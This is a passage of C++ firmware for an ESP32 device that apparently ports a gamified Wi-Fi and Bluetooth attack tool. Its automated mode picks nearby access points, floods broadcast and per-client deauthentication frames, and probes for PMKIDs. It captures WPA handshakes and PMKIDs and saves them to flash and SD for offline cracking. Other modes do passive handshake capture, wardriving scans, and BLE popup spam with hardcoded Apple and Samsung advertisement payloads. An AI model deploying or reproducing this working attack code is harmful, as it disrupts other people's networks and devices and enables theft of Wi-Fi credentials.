        CapturedHandshake nhs; memset(&nhs,0,sizeof(nhs));
        memcpy(nhs.bssid,    slot.bssid, 6);
        memcpy(nhs.station,  slot.sta,   6);
        // Look up SSID
        NetworkRecon::enterCritical();
        auto& nets = NetworkRecon::getNetworks();
        for (auto& n : nets) if(memcmp(n.bssid,slot.bssid,6)==0){ strncpy(nhs.ssid,n.ssid,32); break; }
        NetworkRecon::exitCritical();
        _handshakes.push_back(nhs);
        hs = &_handshakes.back();
      } else continue;
    }
    uint8_t mi = slot.msg - 1;
    if (mi < 4 && hs->frames[mi].len == 0) {
      hs->frames[mi] = slot.frame;
      hs->capturedMask |= (1 << mi);
      hs->lastSeen = millis();
    }
    if (hs->hasValidPair() && !hs->saved) {
      hs->saved = true;
      XP::addHS();
      Mood::onHandshakeCaptured(hs->ssid);
      strncpy(_lastPwnedSSID, hs->ssid, 32);
      strncpy(Display::lootSSID, hs->ssid, 32); Display::lootSSID[32] = '\0';
      Display::showToast("HS CAPTURED!", 2000);
      Serial.printf("[OINK] Handshake: %s\n", hs->ssid);
      SpiffsSave::saveHandshakes();  // persist to SPIFFS
      SpiffsSave::saveHandshakeToSD(*hs); // mirror to SD
      // Transition to WAITING
      if (_autoState == AutoState::ATTACKING) {
        _autoState = AutoState::WAITING;
        _stateStart = millis();
        _deauthing  = false;
      }
    }
  }

  // Process PMKIDs
  while (_pmkR != _pmkW) {
    portENTER_CRITICAL(&_pmkMux);
    uint8_t r = _pmkR;
    PendingPMK slot = _pmkRing[r];
    _pmkR = (r+1) % OINK_PMK_RING;
    portEXIT_CRITICAL(&_pmkMux);

    CapturedPMKID* pk = nullptr;
    for (auto& p : _pmkids) {
      if (memcmp(p.bssid,slot.bssid,6)==0) { pk=&p; break; }
    }
    if (!pk) {
      if (_pmkids.size() < 50) {
        CapturedPMKID np; memset(&np,0,sizeof(np));
        memcpy(np.bssid,   slot.bssid, 6);
        memcpy(np.station, slot.sta,   6);
        NetworkRecon::enterCritical();
        auto& nets = NetworkRecon::getNetworks();
        for (auto& n : nets) if(memcmp(n.bssid,slot.bssid,6)==0){ strncpy(np.ssid,n.ssid,32); break; }
        NetworkRecon::exitCritical();
        _pmkids.push_back(np);
        pk = &_pmkids.back();
      } else continue;
    }
    if (!pk->saved) {
      memcpy(pk->pmkid, slot.pmkid, 16);
      pk->saved = true;
      XP::addPMKID();
      Mood::onPMKIDCaptured(pk->ssid);
      strncpy(_lastPwnedSSID, pk->ssid, 32);
      Display::showToast("PMKID CAPTURED!", 2500);
      Serial.printf("[OINK] PMKID: %s\n", pk->ssid);
      SpiffsSave::savePMKIDs();  // persist to SPIFFS
      SpiffsSave::savePMKIDToSD(*pk); // mirror to SD
    }
  }
}

// ── selectTarget ─────────────────────────────────────────────
static void _selectTarget(int idx) {
  _tgtIdx = idx;
  NetworkRecon::enterCritical();
  auto& nets = NetworkRecon::getNetworks();
  if (idx >= 0 && idx < (int)nets.size()) {
    memcpy(_tgtBssid, nets[idx].bssid, 6);
    _setChannel(nets[idx].channel);
    char msg[48];
    snprintf(msg, sizeof(msg), "LOCKED: %s CH%d", nets[idx].ssid, nets[idx].channel);
    Mood::setStatusMessage(msg);
    Serial.printf("[OINK] Target: %s CH%d\n", nets[idx].ssid, nets[idx].channel);
  }
  NetworkRecon::exitCritical();
}

// ── Public API ───────────────────────────────────────────────
void start() {
  if (_running) return;
  _handshakes.clear(); _handshakes.reserve(5);
  _pmkids.clear();     _pmkids.reserve(10);
  _running = true; _deauthing = false; _channelHopping = true;
  _autoState = AutoState::SCANNING; _stateStart = millis();
  _tgtIdx = -1; memset(_tgtBssid,0,6);
  _deauthTotal = 0; _consecutiveFail = 0;
  _hsW=0; _hsR=0; _pmkW=0; _pmkR=0;
  _oinkStartMs = millis();
  _reconPktStart = NetworkRecon::getPacketCount();
  _lastDeauth = _lastMood = _lastHop = _lastSniff = _lastCleanup = 0;
  _checkedPending = false; _hasPending = false;
  _pmkidTgtIdx = -1; _pmkidProbeTime = 0; _pmkidProbedBits = 0;
  _boarCount = 0;  // reset exclusion list (SD unavailable)
  if (!NetworkRecon::isRunning()) NetworkRecon::start();
  NetworkRecon::setPacketCallback(_eapolCallback);
  Avatar::setState(AvatarState::HAPPY);
  Avatar::setGrassMoving(true); Avatar::setGrassSpeed(120);
  Mood::setStatusMessage("hunting truffles");
  Display::showToast("OINK MODE", 1500);
  Serial.println("[OINK] started");
}

void stop() {
  if (!_running) return;
  _running = false; _deauthing = false;
  NetworkRecon::setPacketCallback(nullptr);
  if (NetworkRecon::isChannelLocked()) NetworkRecon::unlockChannel();
  Avatar::setState(AvatarState::NEUTRAL);
  Avatar::setGrassMoving(false);
  Mood::setStatusMessage("");
  
  Serial.printf("[OINK] stopped. HS:%d PMKID:%d DEAUTH:%lu\n",
    getHandshakeCount(), getPMKIDCount(), _deauthTotal);
}

void update() {
  if (!_running) return;
  uint32_t now = millis();

  _processPending();

  Avatar::setGrassMoving(_channelHopping);

  // ── State machine ──────────────────────────────────────────
  switch (_autoState) {

    case AutoState::SCANNING: {
      // Channel hop
      if (now - _lastHop > 250) { _hopChannel(); _lastHop = now; }
      // Occasional sniff animation
      if (now - _lastSniff > 1000) {
        _lastSniff = now;
        if (random(0,100) < 8) Avatar::sniff();
      }
      // Mood update
      if (now - _lastMood > 3000) {
        auto& nets = NetworkRecon::getNetworks();
        Mood::onSniffing(nets.size(), NetworkRecon::getChannel());
        _lastMood = now;
      }
      // After SCAN_TIME, move to PMKID hunting
      if (now - _stateStart > SCAN_TIME) {
        NetworkRecon::enterCritical();
        bool hasNets = !NetworkRecon::getNetworks().empty();
        NetworkRecon::exitCritical();
        if (hasNets) {
          _autoState = AutoState::PMKID_HUNTING;
          _pmkidTgtIdx = -1; _pmkidProbeTime = 0; _pmkidProbedBits = 0;
          _stateStart = now;
          Mood::setStatusMessage("ghost farming");
        } else {
          _consecutiveFail++;
          if (_consecutiveFail >= BORED_THRESHOLD) {
            _autoState = AutoState::BORED; _stateStart = now;
            _channelHopping = false; Mood::onBored(0);
          } else { _stateStart = now; }
        }
      }
      break;
    }

    case AutoState::PMKID_HUNTING: {
      uint32_t elapsed = now - _stateStart;
      if (elapsed > PMKID_HUNT_MAX) {
        _autoState = AutoState::NEXT_TARGET; _stateStart = now;
        Mood::setStatusMessage("weapons hot"); break;
      }
      if (_pmkidProbeTime == 0 || (now - _pmkidProbeTime >= PMKID_TIMEOUT)) {
        bool found = false;
        uint8_t pBssid[6]={0}; char pSSID[33]={0}; uint8_t pCh=0;
        NetworkRecon::enterCritical();
        auto& nets = NetworkRecon::getNetworks();
        int nc = (int)nets.size();
        for (int att=0; att<nc && !found; att++) {
          _pmkidTgtIdx = (_pmkidTgtIdx+1) % nc;
          const Net& n = nets[_pmkidTgtIdx];
          if (n.authmode==WIFI_AUTH_OPEN || n.authmode==WIFI_AUTH_WEP) continue;
          if (_isExcluded(n.bssid)) continue;
          if (!n.ssid[0] || n.isHidden) continue;
          if (n.hasPMF) continue;
          bool havePMKID=false;
          for (auto& p:_pmkids) if(memcmp(p.bssid,n.bssid,6)==0){havePMKID=true;break;}
          if (havePMKID) continue;
          if (_pmkidTgtIdx<64 && (_pmkidProbedBits&(1ULL<<_pmkidTgtIdx))) continue;
          found=true;
          memcpy(pBssid,n.bssid,6); strncpy(pSSID,n.ssid,32); pCh=n.channel;
        }
        NetworkRecon::exitCritical();
        if (found) {
          if (NetworkRecon::getChannel()!=pCh) NetworkRecon::lockChannel(pCh);
          _sendAssocProbe(pBssid, pSSID, (uint8_t)strlen(pSSID));
          _pmkidProbeTime = now;
          if (_pmkidTgtIdx<64) _pmkidProbedBits |= (1ULL<<_pmkidTgtIdx);
          Avatar::sniff();
        } else {
          _autoState = AutoState::NEXT_TARGET; _stateStart = now;
          Mood::setStatusMessage("weapons hot");
        }
      }
      break;
    }

    case AutoState::NEXT_TARGET: {
      int nxt = _getNextTarget();
      if (nxt < 0) {
        _consecutiveFail++;
        if (_consecutiveFail >= BORED_THRESHOLD) {
          _autoState = AutoState::BORED; _stateStart = now;
          _channelHopping = false; _deauthing = false;
          NetworkRecon::enterCritical();
          Mood::onBored(NetworkRecon::getNetworks().size());
          NetworkRecon::exitCritical();
        } else {
          _autoState = AutoState::SCANNING; _stateStart = now;
          _channelHopping = true; _deauthing = false;
          Mood::setStatusMessage("sniff n drift");
        }
        break;
      }
      _consecutiveFail = 0;
      NetworkRecon::enterCritical();
      bool valid = nxt < (int)NetworkRecon::getNetworks().size();
      if (valid) NetworkRecon::getNetworks()[nxt].attackAttempts++;
      NetworkRecon::exitCritical();
      if (!valid) { _autoState = AutoState::SCANNING; _stateStart = now; break; }
      _selectTarget(nxt);
      _autoState = AutoState::LOCKING; _stateStart = now;
      _deauthing = false; _channelHopping = false;
      Mood::setStatusMessage("sniffin clients");
      Avatar::sniff();
      break;
    }

    case AutoState::LOCKING: {
      if (_tgtIdx < 0) { _autoState = AutoState::NEXT_TARGET; _stateStart = now; _channelHopping=true; break; }
      // Rebind target by BSSID
      int foundIdx = -1;
      Net tgtCopy = {};
      NetworkRecon::enterCritical();
      auto& nets = NetworkRecon::getNetworks();
      for (int i=0;i<(int)nets.size();i++) {
        if (memcmp(nets[i].bssid,_tgtBssid,6)==0){ tgtCopy=nets[i]; foundIdx=i; break; }
      }
      NetworkRecon::exitCritical();
      if (foundIdx < 0) {
        _autoState=AutoState::NEXT_TARGET; _stateStart=now;
        _deauthing=false; _channelHopping=true;
        _tgtIdx=-1; memset(_tgtBssid,0,6); break;
      }
      _tgtIdx = foundIdx;
      uint32_t lockElapsed = now - _stateStart;
      bool hasRecent = tgtCopy.lastDataSeen>0 && (now-tgtCopy.lastDataSeen)<=CLIENT_RECENT_MS;
      if (!hasRecent && lockElapsed >= LOCK_EARLY_EXIT_MS) {
        _autoState=AutoState::NEXT_TARGET; _stateStart=now;
        _deauthing=false; _channelHopping=true;
        _tgtIdx=-1; memset(_tgtBssid,0,6); break;
      }
      if ((hasRecent && lockElapsed >= LOCK_FAST_TRACK_MS) || lockElapsed > LOCK_TIME) {
        _autoState=AutoState::ATTACKING; _attackStart=now;
        _deauthTotal=0; _deauthing=true;
      }
      break;
    }

    case AutoState::ATTACKING: {
      // Rebind by BSSID snapshot
      bool tgtFound = false;
      uint8_t tBssid[6]={0}; char tSSID[33]={0}; bool tPMF=false;
      NetworkRecon::enterCritical();
      auto& nets = NetworkRecon::getNetworks();
      for (int i=0;i<(int)nets.size();i++) {
        if (memcmp(nets[i].bssid,_tgtBssid,6)==0) {
          tgtFound=true; _tgtIdx=i;
          memcpy(tBssid,nets[i].bssid,6);
          strncpy(tSSID,nets[i].ssid,32);
          tPMF=nets[i].hasPMF; break;
        }
      }
      NetworkRecon::exitCritical();
      if (!tgtFound) {
        _autoState=AutoState::NEXT_TARGET; _stateStart=now;
        _deauthing=false; _channelHopping=true; memset(_tgtBssid,0,6); break;
      }
      // PMF check — skip
      if (tPMF) { _autoState=AutoState::NEXT_TARGET; _stateStart=now; break; }

      // Deauth burst every 180ms
      if (now - _lastDeauth > DEAUTH_BURST_MS) {
        uint8_t broadcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        // Always send broadcast burst (catches any STA we haven't tracked yet)
        _sendBurst(tBssid, broadcast, DEAUTH_BURST_COUNT);
        _deauthTotal += DEAUTH_BURST_COUNT;
        // Additionally send targeted deauth to each tracked client
        // This is far more effective than broadcast on modern APs/drivers
        uint8_t clientBuf[CLIENT_MAX_PER_AP * 6];
        uint8_t nClients = NetworkRecon::getClients(tBssid, clientBuf, CLIENT_MAX_PER_AP);
        for (uint8_t ci=0; ci<nClients; ci++) {
          const uint8_t* sta = clientBuf + ci*6;
          _sendBurst(tBssid, sta, 2);  // 2x per client — less airtime, still effective
          _deauthTotal += 2;
        }
        XP::addDeauth();
        _lastDeauth = now;
      }

      // Mood update
      if (now - _lastMood > 2000) {
        Mood::onDeauthing(tSSID, _deauthTotal); _lastMood = now;
      }

      // Check handshake captured
      bool captured = false;
      NetworkRecon::enterCritical();
      for (auto& hs : _handshakes) {
        if (hs.saved && memcmp(hs.bssid,_tgtBssid,6)==0) { captured=true; break; }
      }
      NetworkRecon::exitCritical();
      if (captured) {
        _autoState=AutoState::WAITING; _stateStart=now; _deauthing=false; break;
      }

      // Attack timeout — compute RSSI-scaled cooldown
      if (now - _attackStart > ATTACK_TIMEOUT) {
        NetworkRecon::enterCritical();
        auto& nets2 = NetworkRecon::getNetworks();
        for (auto& n : nets2) {
          if (memcmp(n.bssid,_tgtBssid,6)==0) {
            int8_t r = n.rssiAvg ? n.rssiAvg : n.rssi;
            uint32_t cd = (r>=-45)?4000:(r>=-55)?6000:(r>=-65)?8000:12000;
            n.cooldownUntil = now + cd; break;
          }
        }
        NetworkRecon::exitCritical();
        _autoState=AutoState::WAITING; _stateStart=now; _deauthing=false;
      }
      break;
    }

    case AutoState::WAITING: {
      if (now - _stateStart > WAIT_TIME) {
        if (!_checkedPending) {
          _checkedPending = true; _hasPending = false;
          if (_tgtIdx>=0) {
            NetworkRecon::enterCritical();
            auto& nets = NetworkRecon::getNetworks();
            if (_tgtIdx<(int)nets.size()) {
              for (auto& hs:_handshakes) {
                if (memcmp(hs.bssid,nets[_tgtIdx].bssid,6)==0 && hs.hasM1() && !hs.hasM2()) {
                  _hasPending=true; break;
                }
              }
            }
            NetworkRecon::exitCritical();
          }
        }
        if (_hasPending && now-_stateStart < WAIT_TIME*2) break;
        _checkedPending=false; _hasPending=false;
        _autoState=AutoState::NEXT_TARGET; _stateStart=now;
      }
      break;
    }

    case AutoState::BORED: {
      // Adaptive hop: fast when empty spectrum, slow when networks present but unattackable
      bool anyStrong = false;
      NetworkRecon::enterCritical();
      auto& nets = NetworkRecon::getNetworks();
      for (size_t i=0;i<nets.size()&&i<20;i++) {
        int8_t r=nets[i].rssiAvg?nets[i].rssiAvg:nets[i].rssi;
        if (r>=-80){anyStrong=true;break;}
      }
      bool empty = nets.empty();
      NetworkRecon::exitCritical();

      uint32_t hopMs = empty ? 500 : (anyStrong ? 2000 : 500);
      if (now-_lastHop > hopMs) { _hopChannel(); _lastHop=now; }

      if (now-_lastBoredUpd > 5000) {
        NetworkRecon::enterCritical();
        Mood::onBored(NetworkRecon::getNetworks().size());
        NetworkRecon::exitCritical();
        _lastBoredUpd=now;
      }
      // Check if new valid target appeared
      if (!empty) {
        int nxt = _getNextTarget();
        if (nxt >= 0) {
          _consecutiveFail=0; _autoState=AutoState::NEXT_TARGET;
          _channelHopping=true; _stateStart=now;
          Mood::setStatusMessage("new bacon!"); Avatar::sniff(); break;
        }
      }
      // Periodic retry
      if (now-_stateStart > BORED_RETRY_TIME) {
        _autoState=AutoState::SCANNING; _stateStart=now;
        _channelHopping=true; _consecutiveFail=0;
      }
      break;
    }
  } // switch

  // Periodic index revalidation (NetworkRecon may have cleaned stale nets)
  if (now - _lastCleanup > 5000) {
    _lastCleanup = now;
    if (_tgtIdx >= 0) {
      NetworkRecon::enterCritical();
      int fi=-1;
      auto& nets = NetworkRecon::getNetworks();
      for (int i=0;i<(int)nets.size();i++) if(memcmp(nets[i].bssid,_tgtBssid,6)==0){fi=i;break;}
      NetworkRecon::exitCritical();
      if (fi != _tgtIdx) {
        _tgtIdx = fi;
        if (_tgtIdx < 0) { _deauthing=false; _channelHopping=true; memset(_tgtBssid,0,6); }
      }
    }
  }


}

// ── State display helpers ─────────────────────────────────────
const char* getStateName() {
  switch(_autoState) {
    case AutoState::SCANNING:      return "SCANNING";
    case AutoState::PMKID_HUNTING: return "PMKID-HUNT";
    case AutoState::LOCKING:       return "LOCKING";
    case AutoState::ATTACKING:     return "ATTACKING";
    case AutoState::WAITING:       return "WAITING";
    case AutoState::NEXT_TARGET:   return "NEXT-TGT";
    case AutoState::BORED:         return "BORED";
    default:                       return "???";
  }
}
const char* getTargetSSID() {
  if (_tgtIdx < 0) return "";
  NetworkRecon::enterCritical();
  auto& nets = NetworkRecon::getNetworks();
  static char buf[33];
  if (_tgtIdx < (int)nets.size()) strncpy(buf, nets[_tgtIdx].ssid, 32);
  else buf[0] = 0;
  NetworkRecon::exitCritical();
  return buf;
}
bool isDeauthing()   { return _deauthing; }
bool isRunning()     { return _running; }
bool isLocking()     { return _autoState == AutoState::LOCKING; }
uint32_t getDeauthCount() { return _deauthTotal; }

// Add current attack target to boar bros exclusion list
// Returns true if added, false if already excluded or no target
bool addCurrentTargetToBoarBros() {
  if (_autoState != AutoState::ATTACKING && _autoState != AutoState::LOCKING) return false;
  if (_tgtIdx < 0) return false;
  // Get BSSID directly from _tgtBssid (set when target was locked)
  if (_isExcluded(_tgtBssid)) return false;  // already a bro
  if (_boarCount >= MAX_BOAR_BROS) return false;
  uint64_t k = ((uint64_t)_tgtBssid[0]<<40)|((uint64_t)_tgtBssid[1]<<32)|
               ((uint64_t)_tgtBssid[2]<<24)|((uint64_t)_tgtBssid[3]<<16)|
               ((uint64_t)_tgtBssid[4]<<8)|(uint64_t)_tgtBssid[5];
  _boarBros[_boarCount++] = k;
  // Move to next target
  _tgtIdx = -1; memset(_tgtBssid, 0, 6);
  _autoState = AutoState::SCANNING; _stateStart = millis();
  XP::unlockAchievement(ACH_FIRST_BRO);
  if (_boarCount >= 5)  XP::unlockAchievement(ACH_FIVE_FAMILIES);
  if (_boarCount >= 50) XP::unlockAchievement(ACH_FULL_ROSTER);
  return true;
}
uint8_t getBoarBroCount() { return _boarCount; }

// Accessors for display
const std::vector<CapturedHandshake>& getHandshakes() { return _handshakes; }
const std::vector<CapturedPMKID>&     getPMKIDs()     { return _pmkids; }
uint16_t getHandshakeCount() {
  uint16_t n=0; for(auto&h:_handshakes) if(h.hasValidPair()) n++; return n;
}
uint16_t getPMKIDCount() { return (uint16_t)_pmkids.size(); }

// Load persisted captures back in after reboot (called by SpiffsSave::loadAll)
void injectHandshake(const CapturedHandshake& hs) {
  if ((int)_handshakes.size() >= 20) return;
  // Don't inject duplicates
  for (auto& h : _handshakes)
    if (memcmp(h.bssid, hs.bssid, 6)==0) return;
  _handshakes.push_back(hs);
}
void injectPMKID(const CapturedPMKID& pm) {
  if ((int)_pmkids.size() >= 20) return;
  for (auto& p : _pmkids)
    if (memcmp(p.bssid, pm.bssid, 6)==0 && memcmp(p.pmkid, pm.pmkid, 16)==0) return;
  _pmkids.push_back(pm);
}

// Expose last pwned SSID for OINK display overlay
const char* getLastPwnedSSID() { return _lastPwnedSSID; }

} // namespace OinkMode

// ============================================================
// DO NO HAM MODE — passive EAPOL capture (no deauth attacks)
// Port of src/modes/donoham.cpp
// ============================================================
namespace DNHMode {

static bool _running = false;
static std::vector<CapturedHandshake> _handshakes;
static std::vector<CapturedPMKID>     _pmkids;

struct PendingHS { uint8_t bssid[6],sta[6]; EAPOLFrame frame; uint8_t msg; };
#define DNH_HS_RING 4
static PendingHS _hsRing[DNH_HS_RING];
static volatile uint8_t _hsW=0, _hsR=0;
static portMUX_TYPE _mux = portMUX_INITIALIZER_UNLOCKED;

static void IRAM_ATTR _processDataFrame(const uint8_t* p, uint16_t len, int8_t rssi) {
  if(len<28) return;
  uint8_t toDs=(p[1]&0x01), frDs=(p[1]&0x02)>>1;
  uint16_t off=24;
  if(toDs&&frDs) off+=6;
  uint8_t sub=(p[0]>>4)&0x0F;
  if((sub&0x08)) off+=2;
  if((sub&0x08)&&(p[1]&0x80)) off+=4;
  if(off+8>len) return;
  if(p[off]!=0xAA||p[off+1]!=0xAA||p[off+2]!=0x03||
     p[off+3]!=0||p[off+4]!=0||p[off+5]!=0||p[off+6]!=0x88||p[off+7]!=0x8E) return;
  const uint8_t* eapol=p+off+8;
  uint16_t elen=len-off-8;
  if(elen<4||eapol[1]!=3||elen<99) return;
  uint16_t ki=(eapol[5]<<8)|eapol[6];
  uint8_t ins=(ki>>6)&1, ack=(ki>>7)&1, mic=(ki>>8)&1, sec=(ki>>9)&1;
  uint8_t msg=0;
  if(ack&&!mic)msg=1; else if(!ack&&mic&&!sec)msg=2;
  else if(ack&&mic&&ins)msg=3; else if(!ack&&mic&&sec)msg=4;
  if(!msg) return;
  uint8_t apB[6],sta[6];
  if(msg==1||msg==3){memcpy(apB,p+10,6);memcpy(sta,p+4,6);}
  else{memcpy(apB,p+4,6);memcpy(sta,p+10,6);}
  uint8_t nw=(_hsW+1)%DNH_HS_RING;
  if(nw!=_hsR){
    taskENTER_CRITICAL(&_mux);
    PendingHS& s=_hsRing[_hsW];
    memcpy(s.bssid,apB,6); memcpy(s.sta,sta,6); s.msg=msg;
    uint16_t cl=(elen>512)?512:elen; memcpy(s.frame.data,eapol,cl); s.frame.len=cl;
    uint16_t fl=(len>300)?300:len; memcpy(s.frame.fullFrame,p,fl); s.frame.fullFrameLen=fl;
    s.frame.messageNum=msg; s.frame.timestamp=millis(); s.frame.rssi=rssi;
    _hsW=nw;
    taskEXIT_CRITICAL(&_mux);
  }
}

static void IRAM_ATTR _pktCb(wifi_promiscuous_pkt_t* pkt, wifi_promiscuous_pkt_type_t type) {
  if(!_running||type!=WIFI_PKT_DATA) return;
  uint16_t len=pkt->rx_ctrl.sig_len; if(len>4)len-=4;
  _processDataFrame(pkt->payload,len,pkt->rx_ctrl.rssi);
}

static void _processPending() {
  while(_hsR!=_hsW){
    PendingHS local;
    taskENTER_CRITICAL(&_mux);
    local=_hsRing[_hsR]; _hsR=(_hsR+1)%DNH_HS_RING;
    taskEXIT_CRITICAL(&_mux);
    int idx=-1;
    for(int i=0;i<(int)_handshakes.size();i++)
      if(memcmp(_handshakes[i].bssid,local.bssid,6)==0&&memcmp(_handshakes[i].station,local.sta,6)==0){idx=i;break;}
    if(idx<0&&(int)_handshakes.size()<10){
      CapturedHandshake hs={}; memset(&hs,0,sizeof(hs));
      memcpy(hs.bssid,local.bssid,6); memcpy(hs.station,local.sta,6);
      hs.firstSeen=hs.lastSeen=millis(); _handshakes.push_back(hs); idx=(int)_handshakes.size()-1;
    }
    if(idx<0) continue;
    CapturedHandshake& hs=_handshakes[idx];
    uint8_t fi=local.msg-1;
    if(fi<4&&hs.frames[fi].len==0){
      hs.frames[fi]=local.frame; hs.capturedMask|=(1<<fi); hs.lastSeen=millis();
      if(!hs.ssid[0]){
        int ni=NetworkRecon::findNetworkIndex(hs.bssid);
        if(ni>=0){
          NetworkRecon::enterCritical();
          auto& ns=NetworkRecon::getNetworks();
          if(ni<(int)ns.size()&&ns[ni].ssid[0]){strncpy(hs.ssid,ns[ni].ssid,32);hs.ssid[32]=0;}
          NetworkRecon::exitCritical();
        }
      }
      if(hs.hasValidPair()&&!hs.saved){
        handshakeCount++; XP::addHS();
        char buf[48]; snprintf(buf,sizeof(buf),"PASSIVE HS! %s",hs.ssid[0]?hs.ssid:"???");
        Display::showToast(buf,3000); Mood::onHandshakeCaptured(hs.ssid);
        strncpy(Display::lootSSID, hs.ssid, 32); Display::lootSSID[32] = '\0';
        hs.saved=true;
      }
    }
  }
}

void start() {
  if(_running) return;
  _handshakes.clear(); _pmkids.clear(); _hsW=_hsR=0;
  if(!NetworkRecon::isRunning()) NetworkRecon::start();
  NetworkRecon::setPacketCallback(_pktCb);
  _running=true;
  Avatar::setState(AvatarState::NEUTRAL); Avatar::setGrassMoving(true);
  Display::showToast("DO NO HAM - PASSIVE",2000);
  Mood::onPassiveRecon(NetworkRecon::getNetworkCount(),NetworkRecon::getChannel());
}

void stop() {
  if(!_running) return;
  _running=false;
  NetworkRecon::setPacketCallback(nullptr);
  Avatar::setGrassMoving(false);
  _handshakes.clear(); _pmkids.clear();
}

void update() {
  if(!_running) return;
  NetworkRecon::update(); _processPending();
  netTotal=(uint16_t)NetworkRecon::getNetworkCount(); networkCount=netTotal;
  static uint32_t lm=0;
  if(millis()-lm>5000){Mood::onPassiveRecon(netTotal,NetworkRecon::getChannel());lm=millis();}
}

bool isRunning() { return _running; }
const std::vector<CapturedHandshake>& getHandshakes() { return _handshakes; }
uint16_t getHSCount()    { return (uint16_t)_handshakes.size(); }
uint16_t getPMKIDCount() { return (uint16_t)_pmkids.size(); }

} // namespace DNHMode

// ============================================================
// SGT WARHOG MODE — wardriving, GPS logging, WiGLE CSV export
// Port of src/modes/warhog.cpp
// ============================================================
namespace WarhogMode {

static bool _running        = false;
static bool _scanInProgress = false;
static uint32_t _lastScan   = 0;
static uint32_t _totalNets  = 0;
static uint32_t _lastXP     = 0;
#define WARHOG_SCAN_MS 5000

void start() {
  if(_running) return;
  NetworkRecon::stop();
  WiFi.disconnect(false,true); delay(200);
  WiFi.mode(WIFI_STA); delay(200);
  _running=true; _scanInProgress=false; _lastScan=0; _totalNets=0;
  Avatar::setGrassMoving(gpsHasFix); Avatar::setGrassSpeed(220);
  Avatar::setState(AvatarState::HAPPY);
  Display::showToast("SGT WARHOG DEPLOYED",2000);
  Mood::onWarhogUpdate();
}

void stop() {
  if(!_running) return;
  _running=false; Avatar::setGrassMoving(false);
  WiFi.scanDelete();
  NetworkRecon::start();
}

void update() {
  if(!_running) return;
  Avatar::setGrassMoving(gpsHasFix);
  if(_scanInProgress){
    int n=WiFi.scanComplete();
    if(n==WIFI_SCAN_RUNNING) return;
    _scanInProgress=false;
    if(n>0){
      _totalNets+=n; networkCount=(uint16_t)min((uint32_t)65535,_totalNets);
      uint16_t show=min((uint16_t)n,(uint16_t)MAX_NETS);
      netTotal=show;
      for(int i=0;i<show;i++){
        strncpy(nets[i].ssid,WiFi.SSID(i).c_str(),32); nets[i].ssid[32]=0;
        nets[i].rssi=WiFi.RSSI(i); nets[i].channel=(uint8_t)WiFi.channel(i);
        nets[i].authmode=(uint8_t)WiFi.encryptionType(i);
      }
      XP::addWarhog();
      char buf[32]; snprintf(buf,sizeof(buf),"WARDROVE %lu NETS",(unsigned long)_totalNets);
      Mood::onWarhogFound(buf,0);
    }
    WiFi.scanDelete();
  }
  if(!_scanInProgress&&millis()-_lastScan>WARHOG_SCAN_MS){
    WiFi.scanNetworks(true,true); _scanInProgress=true; _lastScan=millis();
  }
  static uint32_t lm=0;
  if(millis()-lm>5000){Mood::onWarhogUpdate();lm=millis();}
}

bool isRunning()       { return _running; }
uint32_t getTotalNets(){ return _totalNets; }
uint32_t getSavedCount(){ return 0; } // stub — CYD has no WiGLE upload
float getDistanceKm()  { return 0.0f; } // stub — GPS distance tracking TBD

} // namespace WarhogMode

// ============================================================
// PIGGY BLUES — BLE notification spam (educational demonstration)
// Port of src/modes/piggyblues.cpp
// Requires: NimBLE-Arduino by h2zero (Library Manager)
// ============================================================
#if NIMBLE_AVAILABLE
namespace PiggyBlues {

static bool _running  = false;
static uint32_t _lastBurst = 0;
static uint32_t _totalPkts = 0;
static NimBLEAdvertising* _adv = nullptr;

// Apple AirPods proximity payload
static const uint8_t APPLE_AIRPODS[] = {
  0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,
  0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00
};
// Apple TV SetupNew pair
static const uint8_t APPLE_TV[] = {
  0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,
  0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00
};
// Samsung Galaxy Buds Pro
static const uint8_t SAMSUNG_BUDS[] = {
  0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,
  0x01,0x09,0xef,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

static bool _confirmWarning() {
  uint32_t start=millis();
  bool ans=false;
  while(millis()-start<8000){
    if(mainSprite.created()){
      mainSprite.fillSprite(colorBG());
      mainSprite.setTextColor(colorFG(),colorBG());
      mainSprite.setTextSize(1); mainSprite.setTextDatum(TC_DATUM);
      mainSprite.drawString("!! WARNING !!",DISPLAY_W/2,20);
      mainSprite.setTextSize(1);
      mainSprite.drawString("BLE NOTIFICATION SPAM",DISPLAY_W/2,55);
      mainSprite.drawString("FOR EDUCATIONAL USE ONLY",DISPLAY_W/2,71);
      uint32_t rem=(8000-(millis()-start))/1000+1;
      char buf[32]; snprintf(buf,sizeof(buf),"TAP=YES  HOLD=NO (%lus)",rem);
      mainSprite.drawString(buf,DISPLAY_W/2,100);
      mainSprite.drawString("(Exploits BLE popup vuln)",DISPLAY_W/2,120);
      mainSprite.pushSprite(0,TOP_BAR_H);
    }
    int tx,ty; uint8_t ev=Touch::update(tx,ty);
    if(ev==1){ans=true;break;}
    if(ev==2){ans=false;break;}
    delay(50);
  }
  return ans;
}

static void _burst() {
  if(!_adv) return;
  if(_adv->isAdvertising()) _adv->stop();
  NimBLEAdvertisementData data;
  int r=random(0,3);
  uint8_t kind=0;
  if(r==0)      { data.addData((const char*)APPLE_AIRPODS, sizeof(APPLE_AIRPODS)); kind=0; }
  else if(r==1) { data.addData((const char*)APPLE_TV,     sizeof(APPLE_TV));      kind=0; }
  else          { data.addData((const char*)SAMSUNG_BUDS, sizeof(SAMSUNG_BUDS));  kind=2; }
  _adv->setAdvertisementData(data);
  _adv->start();
  _totalPkts++;
  XP::addBLE(kind);
}

void start() {
  if(_running) return;
  if(!_confirmWarning()) return;
  NetworkRecon::stop();
  WiFi.mode(WIFI_OFF); delay(100);
  if(!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  _adv = NimBLEDevice::getAdvertising();
  if(!_adv){ WiFi.mode(WIFI_STA); return; }
  _adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  _running=true; _totalPkts=0; _lastBurst=millis();
